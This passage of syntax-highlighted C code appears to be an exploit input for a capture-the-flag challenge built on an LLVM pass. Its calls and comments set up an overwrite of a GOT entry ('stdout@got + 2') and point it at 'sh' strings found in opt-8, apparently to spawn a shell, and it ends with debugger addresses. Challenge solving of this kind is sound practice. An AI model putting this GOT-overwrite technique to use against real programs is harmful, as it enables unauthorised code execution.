class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n247</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n248</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n249</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n250</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n251</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n252</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n253</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n254</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n255</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n256</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n257</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n258</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n259</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n260</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n261</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n262</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n263</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n264</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n265</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n266</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n267</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n268</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n269</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n270</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n271</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n272</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n273</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n274</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n275</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n276</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n277</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n278</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n279</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n280</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n281</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n282</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n283</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n284</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n285</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n286</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n287</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n288</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n289</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n290</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n291</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n292</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n293</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n294</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n295</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n296</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n297</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n298</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n299</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n300</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n301</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n302</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n303</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n304</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n305</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n306</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n307</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n308</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n309</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n310</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n311</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n312</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n313</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n314</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n315</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n316</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n317</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n318</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n319</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n320</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n321</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n322</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n323</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n324</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n325</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n326</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n327</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n328</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gamestart</span><span class="hljs-params">()</span><br>&#123;<br><br>n0(<span class="hljs-number">1</span>);<br>n1(<span class="hljs-number">1</span>);<br>n2(<span class="hljs-number">1</span>);<br>n3(<span class="hljs-number">1</span>);<br>n4(<span class="hljs-number">1</span>);<br>n5(<span class="hljs-number">1</span>);<br>n6(<span class="hljs-number">1</span>);<br>n7(<span class="hljs-number">1</span>);<br>n8(<span class="hljs-number">1</span>);<br>n9(<span class="hljs-number">1</span>);<br>n10(<span class="hljs-number">1</span>);<br>n11(<span class="hljs-number">1</span>);<br>n12(<span class="hljs-number">1</span>);<br>n13(<span class="hljs-number">1</span>);<br>n14(<span class="hljs-number">1</span>);<br>n15(<span class="hljs-number">1</span>);<br>n16(<span class="hljs-number">1</span>);<br>n17(<span class="hljs-number">1</span>);<br>n18(<span class="hljs-number">1</span>);<br>n19(<span class="hljs-number">1</span>);<br>n20(<span class="hljs-number">1</span>);<br>n21(<span class="hljs-number">1</span>);<br>n22(<span class="hljs-number">1</span>);<br>n23(<span class="hljs-number">1</span>);<br>n24(<span class="hljs-number">1</span>);<br>n25(<span class="hljs-number">1</span>);<br>n26(<span class="hljs-number">1</span>);<br>n27(<span class="hljs-number">1</span>);<br>n28(<span class="hljs-number">1</span>);<br>n29(<span class="hljs-number">1</span>);<br>n30(<span class="hljs-number">1</span>);<br>n31(<span class="hljs-number">1</span>);<br>n32(<span class="hljs-number">1</span>);<br>n33(<span class="hljs-number">1</span>);<br>n34(<span class="hljs-number">1</span>);<br>n35(<span class="hljs-number">1</span>);<br>n36(<span class="hljs-number">1</span>);<br>n37(<span class="hljs-number">1</span>);<br>n38(<span class="hljs-number">1</span>);<br>n39(<span class="hljs-number">1</span>);<br>n40(<span class="hljs-number">1</span>);<br>n41(<span class="hljs-number">1</span>);<br>n42(<span class="hljs-number">1</span>);<br>n43(<span class="hljs-number">1</span>);<br>n44(<span class="hljs-number">1</span>);<br>n45(<span class="hljs-number">1</span>);<br>n46(<span class="hljs-number">1</span>);<br>n47(<span class="hljs-number">1</span>);<br>n48(<span class="hljs-number">1</span>);<br>n49(<span class="hljs-number">1</span>);<br>n50(<span class="hljs-number">1</span>);<br>n51(<span class="hljs-number">1</span>);<br>n52(<span class="hljs-number">1</span>);<br>n53(<span class="hljs-number">1</span>);<br>n54(<span class="hljs-number">1</span>);<br>n55(<span class="hljs-number">1</span>);<br>n56(<span class="hljs-number">1</span>);<br>n57(<span class="hljs-number">1</span>);<br>n58(<span class="hljs-number">1</span>);<br>n59(<span class="hljs-number">1</span>);<br>n60(<span class="hljs-number">1</span>);<br>n61(<span class="hljs-number">1</span>);<br>n62(<span class="hljs-number">1</span>);<br>n63(<span class="hljs-number">1</span>);<br>n64(<span class="hljs-number">1</span>);<br>n65(<span class="hljs-number">1</span>);<br>n66(<span class="hljs-number">1</span>);<br>n67(<span class="hljs-number">1</span>);<br>n68(<span class="hljs-number">1</span>);<br>n69(<span class="hljs-number">1</span>);<br>n70(<span class="hljs-number">1</span>);<br>n71(<span class="hljs-number">1</span>);<br>n72(<span class="hljs-number">1</span>);<br>n73(<span class="hljs-number">1</span>);<br>n74(<span class="hljs-number">1</span>);<br>n75(<span class="hljs-number">1</span>);<br>n76(<span class="hljs-number">1</span>);<br>n77(<span class="hljs-number">1</span>);<br>n78(<span class="hljs-number">1</span>);<br>n79(<span class="hljs-number">1</span>);<br>n80(<span class="hljs-number">1</span>);<br>n81(<span class="hljs-number">1</span>);<br>n82(<span class="hljs-number">1</span>);<br>n83(<span class="hljs-number">1</span>);<br>n84(<span class="hljs-number">1</span>);<br>n85(<span class="hljs-number">1</span>);<br>n86(<span class="hljs-number">1</span>);<br>n87(<span class="hljs-number">1</span>);<br>n88(<span class="hljs-number">1</span>);<br>n89(<span class="hljs-number">1</span>);<br>n90(<span class="hljs-number">1</span>);<br>n91(<span class="hljs-number">1</span>);<br>n92(<span class="hljs-number">1</span>);<br>n93(<span class="hljs-number">1</span>);<br>n94(<span class="hljs-number">1</span>);<br>n95(<span class="hljs-number">1</span>);<br>n96(<span class="hljs-number">1</span>);<br>n97(<span class="hljs-number">1</span>);<br>n98(<span class="hljs-number">1</span>);<br>n99(<span class="hljs-number">1</span>);<br>n100(<span class="hljs-number">1</span>);<br>n101(<span class="hljs-number">1</span>);<br>n102(<span class="hljs-number">1</span>);<br>n103(<span class="hljs-number">1</span>);<br>n104(<span class="hljs-number">1</span>);<br>n105(<span class="hljs-number">1</span>);<br>n106(<span class="hljs-number">1</span>);<br>n107(<span class="hljs-number">1</span>);<br>n108(<span class="hljs-number">1</span>);<br>n109(<span class="hljs-number">1</span>);<br>n110(<span class="hljs-number">1</span>);<br>n111(<span class="hljs-number">1</span>);<br>n112(<span class="hljs-number">1</span>);<br>n113(<span class="hljs-number">1</span>);<br>n114(<span class="hljs-number">1</span>);<br>n115(<span class="hljs-number">1</span>);<br>n116(<span class="hljs-number">1</span>);<br>n117(<span class="hljs-number">1</span>);<br>n118(<span class="hljs-number">1</span>);<br>n119(<span class="hljs-number">1</span>);<br>n120(<span class="hljs-number">1</span>);<br>n121(<span class="hljs-number">1</span>);<br>n122(<span class="hljs-number">1</span>);<br>n123(<span class="hljs-number">1</span>);<br>n124(<span class="hljs-number">1</span>);<br>n125(<span class="hljs-number">1</span>);<br>n126(<span class="hljs-number">1</span>);<br>n127(<span class="hljs-number">1</span>);<br>n128(<span class="hljs-number">1</span>);<br>n129(<span class="hljs-number">1</span>);<br>n130(<span class="hljs-number">1</span>);<br>n131(<span class="hljs-number">1</span>);<br>n132(<span class="hljs-number">1</span>);<br>n133(<span class="hljs-number">1</span>);<br>n134(<span class="hljs-number">1</span>);<br>n135(<span class="hljs-number">1</span>);<br>n136(<span class="hljs-number">1</span>);<br>n137(<span class="hljs-number">1</span>);<br>n138(<span class="hljs-number">1</span>);<br>n139(<span class="hljs-number">1</span>);<br>n140(<span class="hljs-number">1</span>);<br>n141(<span class="hljs-number">1</span>);<br>n142(<span class="hljs-number">1</span>);<br>n143(<span class="hljs-number">1</span>);<br>n144(<span class="hljs-number">1</span>);<br>n145(<span class="hljs-number">1</span>);<br>n146(<span class="hljs-number">1</span>);<br>n147(<span class="hljs-number">1</span>);<br>n148(<span class="hljs-number">1</span>);<br>n149(<span class="hljs-number">1</span>);<br>n150(<span class="hljs-number">1</span>);<br>n151(<span class="hljs-number">1</span>);<br>n152(<span class="hljs-number">1</span>);<br>n153(<span class="hljs-number">1</span>);<br>n154(<span class="hljs-number">1</span>);<br>n155(<span class="hljs-number">1</span>);<br>n156(<span class="hljs-number">1</span>);<br>n157(<span class="hljs-number">1</span>);<br>n158(<span class="hljs-number">1</span>);<br>n159(<span class="hljs-number">1</span>);<br>n160(<span class="hljs-number">1</span>);<br>n161(<span class="hljs-number">1</span>);<br>n162(<span class="hljs-number">1</span>);<br>n163(<span class="hljs-number">1</span>);<br>n164(<span class="hljs-number">1</span>);<br>n165(<span class="hljs-number">1</span>);<br>n166(<span class="hljs-number">1</span>);<br>n167(<span class="hljs-number">1</span>);<br>n168(<span class="hljs-number">1</span>);<br>n169(<span class="hljs-number">1</span>);<br>n170(<span class="hljs-number">1</span>);<br>n171(<span class="hljs-number">1</span>);<br>n172(<span class="hljs-number">1</span>);<br>n173(<span class="hljs-number">1</span>);<br>n174(<span class="hljs-number">1</span>);<br>n175(<span class="hljs-number">1</span>);<br>n176(<span class="hljs-number">1</span>);<br>n177(<span class="hljs-number">1</span>);<br>n178(<span class="hljs-number">1</span>);<br>n179(<span class="hljs-number">1</span>);<br>n180(<span class="hljs-number">1</span>);<br>n181(<span class="hljs-number">1</span>);<br>n182(<span class="hljs-number">1</span>);<br>n183(<span class="hljs-number">1</span>);<br>n184(<span class="hljs-number">1</span>);<br>n185(<span class="hljs-number">1</span>);<br>n186(<span class="hljs-number">1</span>);<br>n187(<span class="hljs-number">1</span>);<br>n188(<span class="hljs-number">1</span>);<br>n189(<span class="hljs-number">1</span>);<br>n190(<span class="hljs-number">1</span>);<br>n191(<span class="hljs-number">1</span>);<br>n192(<span class="hljs-number">1</span>);<br>n193(<span class="hljs-number">1</span>);<br>n194(<span class="hljs-number">1</span>);<br>n195(<span class="hljs-number">1</span>);<br>n196(<span class="hljs-number">1</span>);<br>n197(<span class="hljs-number">1</span>);<br>n198(<span class="hljs-number">1</span>);<br>n199(<span class="hljs-number">1</span>);<br>n200(<span class="hljs-number">1</span>);<br>n201(<span class="hljs-number">1</span>);<br>n202(<span class="hljs-number">1</span>);<br>n203(<span class="hljs-number">1</span>);<br>n204(<span class="hljs-number">1</span>);<br>n205(<span class="hljs-number">1</span>);<br>n206(<span class="hljs-number">1</span>);<br>n207(<span class="hljs-number">1</span>);<br>n208(<span class="hljs-number">1</span>);<br>n209(<span class="hljs-number">1</span>);<br>n210(<span class="hljs-number">1</span>);<br>n211(<span class="hljs-number">1</span>);<br>n212(<span class="hljs-number">1</span>);<br>n213(<span class="hljs-number">1</span>);<br>n214(<span class="hljs-number">1</span>);<br>n215(<span class="hljs-number">1</span>);<br>n216(<span class="hljs-number">1</span>);<br>n217(<span class="hljs-number">1</span>);<br>n218(<span class="hljs-number">1</span>);<br>n219(<span class="hljs-number">1</span>);<br>n220(<span class="hljs-number">1</span>);<br>n221(<span class="hljs-number">1</span>);<br>n222(<span class="hljs-number">1</span>);<br>n223(<span class="hljs-number">1</span>);<br>n224(<span class="hljs-number">1</span>);<br>n225(<span class="hljs-number">1</span>);<br>n226(<span class="hljs-number">1</span>);<br>n227(<span class="hljs-number">1</span>);<br>n228(<span class="hljs-number">1</span>);<br>n229(<span class="hljs-number">1</span>);<br>n230(<span class="hljs-number">1</span>);<br>n231(<span class="hljs-number">1</span>);<br>n232(<span class="hljs-number">1</span>);<br>n233(<span class="hljs-number">1</span>);<br>n234(<span class="hljs-number">1</span>);<br>n235(<span class="hljs-number">1</span>);<br>n236(<span class="hljs-number">1</span>);<br>n237(<span class="hljs-number">1</span>);<br>n238(<span class="hljs-number">1</span>);<br>n239(<span class="hljs-number">1</span>);<br>n240(<span class="hljs-number">1</span>);<br>n241(<span class="hljs-number">1</span>);<br>n242(<span class="hljs-number">1</span>);<br>n243(<span class="hljs-number">1</span>);<br>n244(<span class="hljs-number">1</span>);<br>n245(<span class="hljs-number">1</span>);<br>n246(<span class="hljs-number">1</span>);<br>n247(<span class="hljs-number">1</span>);<br>n248(<span class="hljs-number">1</span>);<br>n249(<span class="hljs-number">1</span>);<br>n250(<span class="hljs-number">1</span>);<br>n251(<span class="hljs-number">1</span>);<br>n252(<span class="hljs-number">1</span>);<br>n253(<span class="hljs-number">1</span>);<br>n254(<span class="hljs-number">1</span>);<br>n255(<span class="hljs-number">1</span>);<br>n256(<span class="hljs-number">1</span>);<br>n257(<span class="hljs-number">1</span>);<br>n258(<span class="hljs-number">1</span>);<br>n259(<span class="hljs-number">1</span>);<br>n260(<span class="hljs-number">1</span>);<br>n261(<span class="hljs-number">1</span>);<br>n262(<span class="hljs-number">1</span>);<br>n263(<span class="hljs-number">1</span>);<br>n264(<span class="hljs-number">1</span>);<br>n265(<span class="hljs-number">1</span>);<br>n266(<span class="hljs-number">1</span>);<br>n267(<span class="hljs-number">1</span>);<br>n268(<span class="hljs-number">1</span>);<br>n269(<span class="hljs-number">1</span>);<br>n270(<span class="hljs-number">1</span>);<br>n271(<span class="hljs-number">1</span>);<br>n272(<span class="hljs-number">1</span>);<br>n273(<span class="hljs-number">1</span>);<br>n274(<span class="hljs-number">1</span>);<br>n275(<span class="hljs-number">1</span>);<br>n276(<span class="hljs-number">1</span>);<br>n277(<span class="hljs-number">1</span>);<br>n278(<span class="hljs-number">1</span>);<br>n279(<span class="hljs-number">1</span>);<br>n280(<span class="hljs-number">1</span>);<br>n281(<span class="hljs-number">1</span>);<br>n282(<span class="hljs-number">1</span>);<br>n283(<span class="hljs-number">1</span>);<br>n284(<span class="hljs-number">1</span>);<br>n285(<span class="hljs-number">1</span>);<br>n286(<span class="hljs-number">1</span>);<br>n287(<span class="hljs-number">1</span>);<br>n288(<span class="hljs-number">1</span>);<br>n289(<span class="hljs-number">1</span>);<br>n290(<span class="hljs-number">1</span>);<br>n291(<span class="hljs-number">1</span>);<br>n292(<span class="hljs-number">1</span>);<br>n293(<span class="hljs-number">1</span>);<br>n294(<span class="hljs-number">1</span>);<br>n295(<span class="hljs-number">1</span>);<br>n296(<span class="hljs-number">1</span>);<br>n297(<span class="hljs-number">1</span>);<br>n298(<span class="hljs-number">1</span>);<br>n299(<span class="hljs-number">1</span>);<br>n300(<span class="hljs-number">1</span>);<br>n301(<span class="hljs-number">1</span>);<br>n302(<span class="hljs-number">1</span>);<br>n303(<span class="hljs-number">1</span>);<br>n304(<span class="hljs-number">1</span>);<br>n305(<span class="hljs-number">1</span>);<br>n306(<span class="hljs-number">1</span>);<br>n307(<span class="hljs-number">0x29</span>);<br>n308(<span class="hljs-number">0x22</span>);<br>n309(<span class="hljs-number">0x41</span>);<br>n310(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// opt-8           0x412229 jae    0x412293 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42c7df jae    0x42c849 /* &#x27;shift_div&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42cbd7 jae    0x42cc41 /* &#x27;sh_nonemptyEv&#x27; */</span><br><span class="hljs-comment">// opt-8           0x432faa jae    0x433014 /* &#x27;shifted_simple_hull_from_set_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4330aa jae    0x433114 /* &#x27;shifted_simple_hull_from_map_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434c56 jae    0x434cc0 /* &#x27;sh_table_init&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434dc9 jae    0x434e33 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434de6 jae    0x434e50 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434e03 jae    0x434e6d /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x437414 jae    0x43747e /* &#x27;sh_bits&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375a5 jae    0x43760f /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375cc jae    0x437636 /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43791b jae    0x437985 /* &#x27;sh_tokens&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43963f jae    0x4396a9 /* &#x27;sh_basis&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43bab0 jae    0x43bb1a /* &#x27;shared_ancestor&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c7be jae    0x43c828 /* &#x27;shift_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c81e jae    0x43c888 /* &#x27;sh_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c88b jae    0x43c8f5 /* &#x27;sh_table_clear&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4413d4 jae    0x44143e /* &#x27;sh_token&#x27; */</span><br><span class="hljs-comment">// opt-8           0x441c6e jae    0x441cd8 /* &#x27;sh_mem&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4429c0 jae    0x442a2a /* &#x27;shared_ptrIN5polly12RejectReasonEELb0EE4growEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443216 jae    0x443280 /* &#x27;sholdEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435b1 jae    0x44361b /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435cf jae    0x443639 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435f3 jae    0x44365d /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443617 jae    0x443681 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443641 jae    0x4436ab /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4452b5 jae    0x44531f /* &#x27;sh_callback&#x27; */</span><br><span class="hljs-comment">// opt-8           0x445c12 jae    0x445c7c /* &#x27;shTableEj&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44636c jae    0x4463d6 /* &#x27;shiftDimEN3isl12noexceptions9union_setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463a0 jae    0x44640a /* &#x27;shiftDimEN3isl12noexceptions3setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463ce jae    0x446438 /* &#x27;shiftDimEN3isl12noexceptions9union_mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44640b jae    0x446475 /* &#x27;shiftDimEN3isl12noexceptions3mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44696b jae    0x4469d5 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446972 jae    0x4469dc /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446984 jae    0x4469ee /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44699b jae    0x446a05 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4469ac jae    0x446a16 /* &#x27;sh&#x27; */</span><br><br><br>n311(<span class="hljs-number">1</span>);<br>n312(<span class="hljs-number">1</span>);<br>n313(<span class="hljs-number">1</span>);<br>n314(<span class="hljs-number">0xda</span>);<br>n315(<span class="hljs-number">0xdf</span>);<br>n316(<span class="hljs-number">0x77</span>);<br>n317(<span class="hljs-number">0</span>);<br>n318(<span class="hljs-number">1</span>);<br><br><br><span class="hljs-comment">// n327(1); // -2</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// n307(1); // cmd</span><br>n316(<span class="hljs-number">1</span>); <span class="hljs-comment">// stdout@got + 2 0x77dfda</span><br>n315(<span class="hljs-number">1</span>); <br>n314(<span class="hljs-number">1</span>); <br>n307(<span class="hljs-number">1</span>); <br>n308(<span class="hljs-number">1</span>); <br>n309(<span class="hljs-number">1</span>); <br>n310(<span class="hljs-number">1</span>); <br><br>fight(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// n264(1); // -1</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// fight(-2);</span><br><span class="hljs-comment">// fight(-3);</span><br><span class="hljs-comment">// fight(-4);</span><br><span class="hljs-comment">// fight(-5);</span><br><span class="hljs-comment">// fight(-6);</span><br><br><span class="hljs-comment">// merge(-1,0);</span><br><span class="hljs-comment">// merge(-1,-2);</span><br><span class="hljs-comment">// merge(-1,-3);</span><br><span class="hljs-comment">// merge(2,3);</span><br>&#125;<br><span class="hljs-comment">// 0x412229</span><br><span class="hljs-comment">// 0x7ffff4e20750 0x7ffff3b63880 0x7ffff3b641d7</span><br><span class="hljs-comment">// 0x7ffff3b57000 0x6668936d277b6892 0x7ffff3b639e6 0x7ffff3b63af6 0x7ffff3b64278 0x7ffff3b641c5</span><br><span class="hljs-comment">/* 0xD2780x7ffff3b641c5</span><br><span class="hljs-comment"> ► 0x7ffff4e2077e &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)+46&gt;    call   llvm::FPPassManager::runOnFunction(llvm::Function&amp;)                &lt;llvm::FPPassManager::runOnFunction(llvm::Function&amp;)&gt;</span><br><span 